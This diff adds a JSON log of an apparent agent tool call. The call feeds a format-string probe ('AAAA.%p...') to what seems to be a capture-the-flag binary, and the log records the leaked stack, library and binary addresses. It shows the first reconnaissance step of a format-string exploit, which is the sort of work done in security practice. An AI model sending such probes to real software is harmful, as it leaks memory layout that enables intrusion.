@@ -1,0 +1,14 @@
+{
+  "tool_results": [],
+  "command_results": [
+    {
+      "command": "run_with_stdin",
+      "status": "ok",
+      "args": {
+        "input_text": "AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
+      },
+      "output": "Name:\nAAAA.0x1.(nil).0xa.(nil).(nil).0x2e70252e41414141.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7025.(nil).(nil).(nil).0x74c9df723af0.0x7ffd0a3caba0.0x7ffd0a3cabe8.0x7ffd0a3cab60.0x74c9df42a1ca.0x7ffd0a3cab10.0x7ffd0a3cabe8.0x100400040.0x401226.0x7ffd0a3cabe8.0x8afd7b46d0977e7b.0x1.(nil).0x403e00.0x74c9df73b000.0x8afd7b46d3f77e7b.0x9c94d1bac5557e7b.0x7ffd00000000.(nil).(nil).0x1.0x7ffd0a3cabe0\nTry again"
+    }
+  ],
+  "shell_results": []
+}
